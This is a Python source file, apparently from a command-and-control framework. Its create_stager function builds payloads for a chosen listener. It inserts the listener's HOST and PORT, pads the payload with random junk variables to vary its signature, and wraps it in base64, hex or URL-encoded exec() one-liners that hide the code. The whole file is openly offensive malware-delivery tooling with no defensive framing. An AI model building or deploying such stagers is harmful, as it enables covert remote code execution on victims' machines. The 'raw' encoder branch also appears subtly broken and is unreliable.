from binascii import hexlify
import urllib.parse
from Utils import *


def create_stager(listener, payload, address, port, encoder, random_size):
    """
    Create a Stager
    """
    try:
        with open("Payloads/" + payload + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")
    # Check if Listener exists
    curr.execute("SELECT * FROM Listeners WHERE Id = ?", (listener,))
    if curr.fetchone() is None:
        raise Exception("Could not find the listener")
    # Randomize the Payload
    if random_size:
        start = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""
    finished_payload = start + "\n" + \
        f"HOST = '{address}'\nPORT = {port}\n" + payload + "\n" + end
    if encoder == "base64":
        finished_payload = """import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
            finished_payload.encode()).decode()
    elif encoder == "hex":
        finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
            finished_payload.encode()).decode()
    elif encoder == "url":
        finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
            finished_payload)
    elif encoder == "raw":
        finished_payload = """exec(b'%s')""" % finished_payload.encode()
    return finished_payload
